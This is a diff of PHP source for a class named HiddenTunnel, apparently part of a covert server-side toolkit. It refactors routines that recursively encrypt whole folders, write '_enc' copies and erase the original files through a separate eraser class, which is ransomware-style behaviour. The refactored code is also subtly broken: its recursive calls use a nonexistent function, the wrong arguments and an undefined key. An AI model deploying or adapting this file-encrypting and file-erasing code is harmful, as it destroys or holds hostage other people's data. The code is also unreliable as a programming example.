@@ -2,63 +2,77 @@
 set_time_limit(0);
 class HiddenTunnel
 {
-    public static function encrypt_data($type, $data, $algorithm, $iv, $dir = null) {
-    
+    private $iv;
+    private $key;
+
+    public function __construct($key, $iv = null) {
+        $this->iv = $iv;
+        $this->key = $key;
+    }
+
+    public function encrypt_data($type, $data, $algorithm, $dir = null) {
+        $options = OPENSSL_RAW_DATA;
+
         if ($type == "folder") {
             $files = array_diff(scandir($dir), array('.', '..'));
-            
+
             foreach ($files as $file) {
                 $file_path = $dir . DIRECTORY_SEPARATOR . $file;
-                
+
                 if (is_dir($file_path)) {
-                    encrypt_data("folder", null, $algorithm, $iv, $file_path);
+                    encrypt_data("folder", null, $algorithm, $key, $this->iv, $file_path);
                 } else {
                     $file_content = file_get_contents($file_path);
-                    $encrypted_content = openssl_encrypt($file_content, $algorithm, $iv);
+                    $encrypted_content = openssl_encrypt($file_content, $algorithm, $this->key, $options, $this->iv);
                     file_put_contents($file_path . "_enc", $encrypted_content);
                     HiddenTunnelEraser::Eraser2($file_path);
                 }
             }
         } else if ($type == "file") {
             $file_content = file_get_contents($data);
-            $encrypted_content = openssl_encrypt($file_content, $algorithm, $iv);
+            $encrypted_content = openssl_encrypt($file_content, $algorithm, $this->key, $options, $this->iv);
             file_put_contents($data . "_enc", $encrypted_content);
             HiddenTunnelEraser::Eraser2($data);
         } else if ($type == "text") {
-            $encrypted_content = openssl_encrypt($data, $algorithm, $iv);
+            $encrypted_content = openssl_encrypt($data, $algorithm, $this->key, $options, $this->iv);
             return $encrypted_content;
         }
-        
+
         return null;
     }
-    public static function decrypt_data($type, $data, $algorithm, $iv, $dir = null) {
-        
+
+    public function decrypt_data($type, $data, $algorithm, $dir = null) {
+        $options = OPENSSL_RAW_DATA;
+
         if ($type == "folder") {
             $files = array_diff(scandir($dir), array('.', '..'));
-            
+
             foreach ($files as $file) {
                 $file_path = $dir . DIRECTORY_SEPARATOR . $file;
-                
+
                 if (is_dir($file_path)) {
-                    decrypt_data("folder", null, $algorithm, $iv, $file_path);
+                    decrypt_data("folder", null, $algorithm, $this->key, $this->iv, $file_path);
                 } else {
                     $file_content = file_get_contents($file_path);
-                    $decrypted_content = openssl_decrypt($file_content, $algorithm, $iv);
+                    $decrypted_content = openssl_decrypt($file_content, $algorithm, $this->key, $options, $this->iv);
                     file_put_contents(str_replace("_enc", "", $file_path), $decrypted_content);
                     HiddenTunnelEraser::Eraser2($file_path);
                 }
             }
         } else if ($type == "file") {
             $file_content = file_get_contents($data);
-            $decrypted_content = openssl_decrypt($file_content, $algorithm, $iv);
+            $decrypted_content = openssl_decrypt($file_content, $algorithm, $this->key, $options, $this->iv);
             file_put_contents(str_replace("_enc", "", $data), $decrypted_content);
             HiddenTunnelEraser::Eraser2($data);
         } else if ($type == "text") {
-            $decrypted_content = openssl_decrypt($data, $algorithm, $iv);
+            $decrypted_content = openssl_decrypt($data, $algorithm, $this->key, $options, $this->iv);
             return $decrypted_content;
         }
-        
+
         return null;
+    }
+    public function add_key($new_key) {
+        $this->key = $new_key;
     }
     static function HiddenTunnelHASH($b, $c = 64)
     {
